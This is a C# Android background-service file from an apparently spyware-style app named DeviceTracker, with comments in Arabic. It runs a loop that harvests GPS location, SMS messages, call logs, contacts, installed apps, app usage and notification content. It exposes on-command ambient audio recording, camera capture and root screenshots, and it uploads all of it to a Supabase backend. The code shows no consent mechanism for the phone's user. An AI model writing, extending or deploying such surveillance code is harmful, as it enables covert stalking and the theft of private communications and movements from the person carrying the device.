using Android.Content;
using DeviceTracker.Models;
using DeviceTracker.Services.Collectors;
using DeviceTracker.Services.Media;

namespace DeviceTracker.Services;

/// <summary>
/// خدمة الخلفية الرئيسية — تجمع ALL data types دورياً.
///
/// أنواع البيانات المجموعة:
/// ● GPS Location (كل دورة)
/// ● Device State (بطارية، شبكة، تخزين)
/// ● Installed Apps (كل 30 دقيقة)
/// ● Call Logs (كل دورة)
/// ● SMS Messages (كل دورة)
/// ● Contacts (كل 6 ساعات)
/// ● App Usage Stats (كل ساعة)
/// ● Ambient Audio (حسب الأمر)
/// ● Camera Photos (حسب الأمر)
/// ● Screenshots (حسب الأمر — يتطلب Root)
/// ● Notification Content (مستمر عبر NotificationListener)
/// </summary>
public sealed class DeviceBackgroundService : IDisposable
{
    private readonly LocalDatabaseService _localDb;
    private readonly SupabaseService _supabase;
    public EncryptionService Encryption { get; }
    private readonly IConnectivity _connectivity;
    private readonly IGeolocation _geolocation;
    private CancellationTokenSource? _cts;

    private string _deviceSerial = string.Empty;

    public bool IsRunning { get; private set; }

    public DeviceBackgroundService(
        LocalDatabaseService localDb,
        SupabaseService supabase,
        EncryptionService encryption,
        IConnectivity connectivity,
        IGeolocation geolocation)
    {
        _localDb = localDb;
        _supabase = supabase;
        Encryption = encryption;
        _connectivity = connectivity;
        _geolocation = geolocation;
    }

    public async Task StartAsync()
    {
        if (IsRunning) return;
        IsRunning = true;

        _cts = new CancellationTokenSource();

        _deviceSerial = Preferences.Get("device_serial", string.Empty);
        if (string.IsNullOrEmpty(_deviceSerial))
        {
            _deviceSerial = $"DEV-{Guid.NewGuid():N}"[..20].ToUpper();
            Preferences.Set("device_serial", _deviceSerial);
        }

        await _supabase.RegisterDeviceAsync(_deviceSerial);
        _ = RunCollectionLoopAsync(_cts.Token);
    }

    public void Stop()
    {
        _cts?.Cancel();
        IsRunning = false;
    }

    private async Task RunCollectionLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await CollectAndStoreAllAsync(ct);
                await TryImmediateSyncAsync(ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[BG] Error: {ex.Message}");
            }

            var interval = Preferences.Get("collection_interval_minutes", 5);
            await Task.Delay(TimeSpan.FromMinutes(interval), ct);
        }
    }

    /// <summary>
    /// جمع جميع أنواع البيانات (public للاستدعاء من CommandExecutor)
    /// </summary>
    public async Task CollectAndStoreAllAsync(CancellationToken ct)
    {
        await CollectLocationAsync(ct);
        await CollectDeviceStateAsync(ct);
        await CollectInstalledAppsAsync(ct);
        CollectCallLogs();
        CollectSms();
        await CollectContactsIfNeededAsync();
        await CollectAppUsageIfNeededAsync();
        await _supabase.SendHeartbeatAsync();
    }

    /// <summary>
    /// جمع نوع بيانات محدد ورفعه فوراً إلى Supabase بدون انتظار Sync
    /// </summary>
    public async Task CollectAndUploadAsync(string dataType, CancellationToken ct)
    {
        try
        {
            switch (dataType)
            {
                case "location":
                    await CollectLocationAsync(ct);
                    var locs = await _localDb.GetUnsyncedLocationsAsync(5);
                    foreach (var r in locs)
                    {
                        if (await _supabase.PushLocationAsync(r))
                        {
                            r.IsSynced = true;
                            await _localDb.MarkAsSyncedAsync(r);
                        }
                    }
                    break;

                case "call_logs":
                    CollectCallLogs();
                    var calls = await _localDb.GetUnsyncedCallLogsAsync(50);
                    foreach (var r in calls)
                    {
                        if (await _supabase.PushCallLogAsync(r))
                        {
                            r.IsSynced = true;
                            await _localDb.MarkAsSyncedAsync(r);
                        }
                    }
                    break;

                case "sms":
                    CollectSms();
                    var smsList = await _localDb.GetUnsyncedSmsAsync(50);
                    foreach (var r in smsList)
                    {
                        if (await _supabase.PushSmsAsync(r))
                        {
                            r.IsSynced = true;
                            await _localDb.MarkAsSyncedAsync(r);
                        }
                    }
                    break;

                case "contacts":
                    await CollectContactsAsync();
                    var contacts = await _localDb.GetUnsyncedContactsAsync(100);
                    foreach (var r in contacts)
                    {
                        if (await _supabase.PushContactAsync(r))
                        {
                            r.IsSynced = true;
                            await _localDb.MarkAsSyncedAsync(r);
                        }
                    }
                    break;

                case "apps":
                    await CollectInstalledAppsAsync(ct);
                    var apps = await _localDb.GetUnsyncedAppsAsync(50);
                    foreach (var r in apps)
                    {
                        if (await _supabase.PushInstalledAppsAsync(new[] { r }))
                        {
                            r.IsSynced = true;
                            await _localDb.MarkAsSyncedAsync(r);
                        }
                    }
                    break;
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[BG] CollectAndUpload({dataType}) error: {ex.Message}");
        }
    }

    // ======================= LOCATION =======================
    public async Task CollectLocationAsync(CancellationToken ct)
    {
        try
        {
            var location = await _geolocation.GetLocationAsync(new GeolocationRequest
            {
                DesiredAccuracy = GeolocationAccuracy.High,
                Timeout = TimeSpan.FromSeconds(30)
            }, ct);

            if (location is null) return;

            await _localDb.SaveLocationAsync(new LocationRecord
            {
                DeviceSerial = _deviceSerial,
                Latitude = location.Latitude,
                Longitude = location.Longitude,
                Altitude = (float)(location.Altitude ?? 0),
                Accuracy = (float)(location.Accuracy ?? 0),
                Speed = (float)(location.Speed ?? 0),
                Bearing = (float)(location.Course ?? 0),
                CapturedAt = DateTime.UtcNow
            });
        }
        catch (FeatureNotSupportedException) { }
        catch (PermissionException) { }
    }

    // ======================= DEVICE STATE =======================
    public async Task CollectDeviceStateAsync(CancellationToken ct)
    {
        try
        {
            var battery = Battery.Default;
            var conn = Connectivity.Current;
            var appDataDir = FileSystem.AppDataDirectory;
            var driveInfo = new DriveInfo(Path.GetPathRoot(appDataDir) ?? appDataDir);

            await _localDb.SaveDeviceStateAsync(new DeviceStateRecord
            {
                DeviceSerial = _deviceSerial,
                BatteryLevel = battery.ChargeLevel * 100,
                BatteryStatus = battery.PowerSource != BatteryPowerSource.Battery ? "charging" : "discharging",
                IsCharging = battery.PowerSource != BatteryPowerSource.Battery,
                NetworkType = conn.NetworkAccess == NetworkAccess.Internet
                    ? "cellular_4g"
                    : "none",
                StorageTotal = driveInfo.TotalSize,
                StorageAvailable = driveInfo.AvailableFreeSpace,
                CapturedAt = DateTime.UtcNow
            });
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] State error: {ex.Message}"); }
    }

    // ======================= INSTALLED APPS =======================
    public async Task CollectInstalledAppsAsync(CancellationToken ct)
    {
        try
        {
            var context = Android.App.Application.Context;
            var pm = context.PackageManager;
            if (pm == null) return;

            var intent = new Intent(Intent.ActionMain);
            intent.AddCategory(Intent.CategoryLauncher);
            var apps = pm.QueryIntentActivities(intent, 0);

            var records = new List<InstalledAppRecord>();
            foreach (var app in apps.Take(100))
            {
                try
                {
                    var ai = pm.GetApplicationInfo(app.ActivityInfo.PackageName, 0);
                    records.Add(new InstalledAppRecord
                    {
                        DeviceSerial = _deviceSerial,
                        PackageName = app.ActivityInfo.PackageName,
                        AppName = ai.LoadLabel(pm)?.ToString() ?? app.ActivityInfo.PackageName,
                        VersionName = pm.GetPackageInfo(app.ActivityInfo.PackageName, 0)?.VersionName ?? "",
                        VersionCode = pm.GetPackageInfo(app.ActivityInfo.PackageName, 0)?.LongVersionCode ?? 0,
                        IsSystemApp = (ai.Flags & Android.Content.PM.ApplicationInfoFlags.System) != 0,
                        CapturedAt = DateTime.UtcNow
                    });
                }
                catch { }
            }

            if (records.Count > 0)
                await _localDb.SaveInstalledAppsAsync(records);
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] Apps error: {ex.Message}"); }
    }

    // ======================= CALL LOGS =======================
    public Task CollectCallLogsAsync()
    {
        CollectCallLogs();
        return Task.CompletedTask;
    }

    public void CollectCallLogs()
    {
        try
        {
            var context = Android.App.Application.Context;
            var records = CallLogCollector.Collect(context);
            if (records.Count > 0)
                _ = _localDb.SaveCallLogsAsync(records);
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] CallLogs error: {ex.Message}"); }
    }

    // ======================= SMS =======================
    public Task CollectSmsAsync()
    {
        CollectSms();
        return Task.CompletedTask;
    }

    public void CollectSms()
    {
        try
        {
            var context = Android.App.Application.Context;
            var records = SmsCollector.Collect(context);
            if (records.Count > 0)
                _ = _localDb.SaveSmsMessagesAsync(records);
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] SMS error: {ex.Message}"); }
    }

    // ======================= CONTACTS (كل 6 ساعات) =======================
    private async Task CollectContactsIfNeededAsync()
    {
        var last = Preferences.Get("last_contacts_scan", DateTime.MinValue.ToString("o"));
        if (DateTime.UtcNow - DateTime.Parse(last) < TimeSpan.FromHours(6))
            return;

        await CollectContactsAsync();
        Preferences.Set("last_contacts_scan", DateTime.UtcNow.ToString("o"));
    }

    public async Task CollectContactsAsync()
    {
        try
        {
            var context = Android.App.Application.Context;
            var records = ContactCollector.Collect(context);
            if (records.Count > 0)
                await _localDb.SaveContactsAsync(records);
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] Contacts error: {ex.Message}"); }
    }

    // ======================= APP USAGE (كل ساعة) =======================
    private async Task CollectAppUsageIfNeededAsync()
    {
        var last = Preferences.Get("last_usage_scan", DateTime.MinValue.ToString("o"));
        if (DateTime.UtcNow - DateTime.Parse(last) < TimeSpan.FromHours(1))
            return;

        var context = Android.App.Application.Context;
        var records = AppUsageCollector.Collect(context);
        if (records.Count > 0)
            await _localDb.SaveAppUsageAsync(records);
        Preferences.Set("last_usage_scan", DateTime.UtcNow.ToString("o"));
    }

    // ======================= MEDIA CAPTURES =======================
    public async Task CaptureCameraAsync(string facing = "rear")
    {
        var context = Android.App.Application.Context;
        var result = await CameraCaptureService.CapturePhotoAsync(context, facing);
        if (result != null)
            await _localDb.SaveMediaCaptureAsync(result);
    }

    public async Task<MediaCaptureRecord?> StartAmbientRecordingAsync(int durationSeconds = 30)
    {
        using var recorder = new AudioRecorderService();
        var result = await recorder.StartRecordingAsync(durationSeconds);
        if (result != null)
            await _localDb.SaveMediaCaptureAsync(result);
        return result;
    }

    public async Task CaptureScreenshotAsync()
    {
        var result = await ScreenshotService.CaptureScreenshotAsync();
        if (result != null)
            await _localDb.SaveMediaCaptureAsync(result);
    }

    // ======================= SYNC =======================
    public async Task SyncAllPendingAsync()
    {
        var context = Android.App.Application.Context;
        var cm = context.GetSystemService(Context.ConnectivityService) as Android.Net.ConnectivityManager;
        var activeNetwork = cm?.ActiveNetworkInfo;
        if (activeNetwork == null || !activeNetwork.IsConnectedOrConnecting)
            return;

        await TryImmediateSyncAsync(CancellationToken.None);
    }

    private async Task TryImmediateSyncAsync(CancellationToken ct)
    {
        if (_connectivity.NetworkAccess != NetworkAccess.Internet) return;

        try
        {
            // Location
            foreach (var r in await _localDb.GetUnsyncedLocationsAsync(25))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushLocationAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // Device State
            foreach (var r in await _localDb.GetUnsyncedStatesAsync(25))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushDeviceStateAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // Call Logs
            foreach (var r in await _localDb.GetUnsyncedCallLogsAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushCallLogAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // SMS
            foreach (var r in await _localDb.GetUnsyncedSmsAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushSmsAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // Contacts
            foreach (var r in await _localDb.GetUnsyncedContactsAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushContactAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // Installed Apps
            foreach (var r in await _localDb.GetUnsyncedAppsAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushInstalledAppsAsync(new[] { r }))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // App Usage
            foreach (var r in await _localDb.GetUnsyncedAppUsageAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushAppUsageAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            // Notifications
            foreach (var r in await _localDb.GetUnsyncedNotificationsAsync(50))
            {
                if (ct.IsCancellationRequested) break;
                if (await _supabase.PushNotificationAsync(r))
                { r.IsSynced = true; await _localDb.MarkAsSyncedAsync(r); }
            }
            await _localDb.CleanOldSyncedRecordsAsync();
        }
        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] Sync error: {ex.Message}"); }
    }

    public void Dispose()
    {
        _cts?.Cancel();
        _cts?.Dispose();
    }
}
